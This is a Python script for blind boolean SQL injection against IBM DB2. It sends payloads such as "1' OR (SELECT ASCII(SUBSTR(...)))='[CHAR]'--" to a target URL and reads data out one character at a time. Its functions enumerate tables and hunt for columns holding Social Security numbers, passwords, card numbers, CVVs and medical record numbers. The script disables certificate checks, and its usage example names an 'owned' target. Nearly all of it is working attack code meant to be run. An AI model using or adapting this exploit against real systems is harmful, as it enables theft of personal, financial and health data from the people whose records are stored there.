#!/usr/bin/env python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

def send_injected_query(char_type_range, iterator, target_url, injected_query, true_response_text):
    for charnum in char_type_range:
        injected_url = "%s%s" % (target_url, injected_query.replace("[CHAR]", str(charnum)))
        #print injected_url                                                                         
        # Submit request
        try:
            r = requests.get(injected_url,verify=False,timeout=10)
        except:
            print "\033[%sC" % (iterator+1) + chr(charnum) + "\r",                                                                                                                                                 
            sys.stdout.flush()      
            continue     
        # If Content-Length indicates successful injection, return character                                                                                                                                                                                
        #content_length = int(r.headers['Content-Length'])
        # If response body indicates successful injection, return character                                                                                                                                                                                                                                                                                        
        if true_response_text in r.text:                                                                                                                                                                                  
            return charnum                                                                                                                                                                                         
        else:                                                                                                                                                                                                      
            print "\033[%sC" % (iterator+1) + chr(charnum) + "\r",                                                                                                                                                 
            sys.stdout.flush()                                                                                                                                                                                     
    return None

def inject_query(field_length, char_type, query, target_url, true_response_text):
    extracted_string = "  "
    # For the number of characters in the field_length, loop through every ASCII hex character                                                                                                                     
    for i in range(1, field_length):                                                                                                                                                                               
        injected_query = "1' OR (SELECT ASCII(SUBSTR((%s),%d,1)) FROM sysibm.sysdummy1)='[CHAR]'--" % (query, i)
        try:                                                                                                                                                                                                       
            extracted_char = chr(send_injected_query(char_type, i, target_url, injected_query, true_response_text))                                                                                                                                      
            extracted_string += extracted_char                                                                                                                                                                     
        except:                                                                                                                                                                                                    
            print extracted_string                                                                                                                                                                                 
            break                                                                                                                                                                                                  
        print extracted_string + "\r",                                                                                                                                                                             
        sys.stdout.flush()                                                                                                                                                                                         
    return extracted_string

def get_table_names():
    table_names = []
    #print "(-) Extracting the number of tables in the database:"
    #tables_count = int(inject_query(8, numeric, "select count(*) from sysibm.systables where type='T'", target_url, true_response_text))
    #tables_count = 188
    tables_count = 188
    print "(-) Extracting table names:"
    # OFFSET and LIMIT didn't work because some versions of DB2 for z/OS don't support them, so had to create a row_number function
    #table_name = inject_query(64, upper_lower_numeric_symbols, "select name from (select name, row_number() over(order by name desc) as row_number from sysibm.systables where type='T') where row_number = 1", target_url, true_response_text)
    for i in range(1, tables_count):
        table_name = inject_query(64, upper_numeric_symbols, "select name from (select name, row_number() over(order by name asc) as row_number from sysibm.systables where type='T') where row_number = %s" % i, target_url, true_response_text)
        table_names += table_name
    #table_names += table_name
    return table_names

def get_column_names():
    column_names_tbnames = []
    #print "(-) Extracting the number of columns in the database:"
    #column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns", target_url, true_response_text))
    print "(-) Extracting the number of columns of interest in the database:"
    # ALL KEYWORDS
    #column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns where name like '%ACCOUNT%' or name like '%ADDRESS%' or name like '%CC_%' or name like '%CCN%' or name like '%CVV%' or name like '%CREDIT%' or name like '%%EMAIL%' or name like '%MEDICAL%' or name like '%MRN%' or name like '%PAN%' or name like '%PASS%' or name like '%PATIENT%' or name like '%PHONE%' or name like '%SOCIAL%' or name like '%SSN%' or name like '%USER%' or name like '%ZIP%'", target_url, true_response_text))
    # PASSWORDS
    #print "(-) Extracting the number of columns matching 'PASSWORD' in the database:"
    #column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns where name like '%PASSWORD%'", target_url, true_response_text))
    # CHD
    #print "(-) Extracting the number of columns matching 'CVV' and 'CREDIT_CARD' in the database:"
    #column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns where name like '%CVV%' or name like '%CREDIT_CARD%'", target_url, true_response_text))
    # SSN
    print "(-) Extracting the number of columns matching 'SOCIAL_SEC', and 'SSN' in the database:"
    column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns where name like '%SOCIAL_SEC%' or name like '%SSN%'", target_url, true_response_text))
    # PHI
    #print "(-) Extracting the number of columns matching 'MRN' in the database:"
    #column_count = int(inject_query(8, numeric, "select count(*) from sysibm.syscolumns where name like '%MRN%'", target_url, true_response_text))      
    print "(-) Extracting column of interest names in format COLUMNNAME: TABLENAME:"
    for i in range(1, column_count):
        #column_name_tbname = inject_query(128, upper_lower_numeric_symbols, "select concat(concat((select name from (select name, row_number() over(order by name asc) as row_number from sysibm.syscolumns) where row_number=%d), ' '),(select tbname from (select tbname, row_number() over(order by name asc) as row_number from sysibm.syscolumns) where row_number=%d)) from sysibm.sysdummy1" % (i,i), target_url, true_response_text)
        
        print "(-) Extracting COLUMNNAME:"
        # PASSWORDS
        #column_name = inject_query(64, upper_underscore, "select name from (select name, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%PASSWORD%%') where row_number=%d" % i, target_url, true_response_text)
        # CHD
        #column_name = inject_query(64, upper_underscore, "select name from (select name, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%CVV%%' or name like '%%CREDIT_CARD%%') where row_number=%d" % i, target_url, true_response_text)
        # SSN
        column_name = inject_query(64, upper_underscore, "select name from (select name, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%SOCIAL_SEC%%' or name like '%%SSN%%') where row_number=%d" % i, target_url, true_response_text)
        
        print "(-) Extracting TABLENAME for column above:"
        # PASSWORDS
        #column_tbname = inject_query(128, upper_underscore, "select tbname from (select tbname, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%PASSWORD%%') where row_number=%d" % i, target_url, true_response_text)
        # CHD
        #column_tbname = inject_query(128, upper_underscore, "select tbname from (select tbname, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%CVV%%' or name like '%%CREDIT_CARD%%') where row_number=%d" % i, target_url, true_response_text)
        # SSN
        column_tbname = inject_query(128, upper_underscore, "select tbname from (select tbname, row_number() over(order by name asc) as row_number from sysibm.syscolumns where name like '%%SOCIAL_SEC%%' or name like '%%SSN%%') where row_number=%d" % i, target_url, true_response_text)       
        
        column_name_tbname = column_name + ": " + column_tbname
        print column_name_tbname
        column_names_tbnames += column_name_tbname

# def get_udfs():

if __name__ == "__main__":
    # Input
    if len(sys.argv) != 3:
        print "(!) Usage:           %s <target_url> <true_response_text>" % sys.argv[0]
        print "(-) Example:         %s \"https://owned.pwnd.com/id=\" \"Enrollment ID: 94084\"" % sys.argv[0]
        sys.exit(-1)
    target_url = sys.argv[1]
    true_response_text = sys.argv[2]

    # ASCII character ranges, ordered by probability
    upper_underscore = list(range(65,90))
    upper_underscore.append(95)
    upper_lower_numeric_symbols = list(range(32,126))
    upper_numeric_symbols = list(range(65,96)) + list(range(32,64)) + list(range(123,126))
    upper_lower_numeric = list(range(48,57)) + list(range(65,90)) + list(range(97,122))
    upper_lower = list(range(65,90)) + list(range(97,122))
    upper = range(65,90)
    lower = range(97,122)
    numeric = range(48,57)
    
    # Output
    print "(-) Target URL:              %s" % target_url
    print "(-) Response when True:      %s" % true_response_text
    print "(-) Injecting queries and sending to target"
    #print "(-) Extracting the name of the current database:"
    #current_database = inject_query(16, upper, "current server", target_url, true_response_text)
    #table_names = get_table_names()
    get_column_names()
    print "\n(+) Done!"